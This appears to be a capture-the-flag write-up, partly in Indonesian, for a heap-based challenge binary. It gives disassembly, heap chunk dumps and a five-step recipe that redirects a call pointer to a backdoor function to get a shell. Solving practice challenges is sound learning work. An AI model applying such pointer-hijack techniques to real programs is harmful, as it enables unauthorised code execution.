input :
POST -> <KKST/2020> -> data
DELETE -> <address decimal number>
GET -> <address decimal number>
PUT -> <address decimal number> -> data



# POST->KKST
jmp 0x8048991
call fgets(input, 0x7ff)
...
call 0x8048fc0

# DELETE
jmp 0x8048a30
call strtol(input)  <--- convert string to long integer
...
call 0x8048f10

# 0x8048fc0
var_a = strlen(input)
var_b = call sym operator new(void*)
call strncpy(var_b, input, var_b+1)


# heap structure
[0x11]
[0x411]
[post data goes here]

- POST -> 2020 -> AAAABBBB => 0x8050fd0
...
0x8050fc8	0x00000000	0x00000011	........
0x8050fd0	0x0804930c	0x00000009	........
0x8050fd8	0x08050fe0	0x00000011	........
0x8050fe0	0x41414141	0x42424242	AAAABBBB
0x8050fe8	0x0000000a	0x00000011	........
0x8050ff0	0x08050fd0	0x00000001	........
0x8050ff8	0x08050fd0	0x0001d009	........	 <-- Top chunk
- PUT -> 0x8050fd0 -> KKKKOOOO => 0x8051000
...
0x8050fc8	0x00000000	0x00000011	........
0x8050fd0	0x0804930c	0x00000009	........
0x8050fd8	0x08050fe0	0x00000011	........
0x8050fe0	0x41414141	0x42424242	AAAABBBB
0x8050fe8	0x0000000a	0x00000011	........
0x8050ff0	0x08051000	0x00000001	........
0x8050ff8	0x08051000	0x00000011	........
0x8051000	0x4b4b4b4b	0x4f4f4f4f	KKKKOOOO
0x8051008	0x0000000a	0x0001cff9	........	 <-- Top chunk

- POST -> KKST -> AAAABBBB => 0x8050fd0
...
0x8050fc8	0x00000000	0x00000011	........
0x8050fd0	0x41414141	0x42424242	AAAABBBB
0x8050fd8	0x0000000a	0x00000011	........
0x8050fe0	0x08050fd0	0x00000000	........
0x8050fe8	0x08050fd0	0x0001d019	........	 <-- Top chunk
- PUT -> 0x8050fd0 -> KKKKOOOO => 0x8050ff0
...
0x8050fc8	0x00000000	0x00000011	........
0x8050fd0	0x41414141	0x42424242	AAAABBBB
0x8050fd8	0x0000000a	0x00000011	........
0x8050fe0	0x08050ff0	0x00000000	........
0x8050fe8	0x08050ff0	0x00000011	........
0x8050ff0	0x4b4b4b4b	0x4f4f4f4f	KKKKOOOO
0x8050ff8	0x0000000a	0x0001d009	........	 <-- Top chunk




# bug & exploitation

di fungsi "GET" ada pengecekan jika inputan "POST" kita memakai
string "KKST" atau "2020" :
```
   0x8048d80    mov    eax, dword ptr [edx + 4]
   0x8048d83    cmp    eax, 1
   0x8048d86    je     0x8048d9f <0x8048d9f>
```
jika memakai inputan "KKST" maka akan diskip, jika "2020" maka akan
ada fungsi tambahan seperti fungsi backdoor (ada call ke eax).

fungsi tambahan tersebut mencocokkan jika inputan kita sama dengan
address 0x8048c00 atau tidak :
```
   0x8048d9f    mov    edi, dword ptr [edx + 8]
   0x8048da2    mov    eax, dword ptr [edi]
   0x8048da4    mov    eax, dword ptr [eax + 8]
   0x8048da7    cmp    eax, 0x8048c00
   0x8048dac    jne    0x8048e0f <0x8048e0f>
```
jika iya, maka akan mengoutput isi dari address yang kita inputkan pada
fungsi "GET". jika tidak maka akan melanjutkan eksekusi ke fungsi backdoor :
```
   0x8048e0f    sub    esp, 0xc
   0x8048e12    push   edi
   0x8048e13    call   eax    <--- inputan kita akan dieksekusi
```

berikut cara mendapatkan celah write-what-where dari fungsi backdoor tersebut :
```
a = POST->2020->8 char
b = PUT->address a (ini akan merubah struktur saat pengecekan dengan 0x8048c00)
GET->address b
```

jika inputan kita bukan menuju address pointer, maka akan error pada address 0x8048da4.
cara tercepat untuk mendapatkan shell dengan mengoverwrite eax dengan address fungsi backdoor
pada 0x08048fa0, seperti berikut :
1.) buat alokasi a, dengan POST -> KKST -> (payload)
2.) payload alokasi a berisi 8 byte dummy data dan 4 byte address dari fungsi backdoor 0x08048fa0
3.) buat alokasi b, dengan POST -> 2020 -> (data terserah)
4.) PUT -> address alokasi b, ini untuk merubah struktur saat pengecekan dengan 0x8048c00
5.) GET -> address alokasi b, untuk menjalankan fungsi backdoor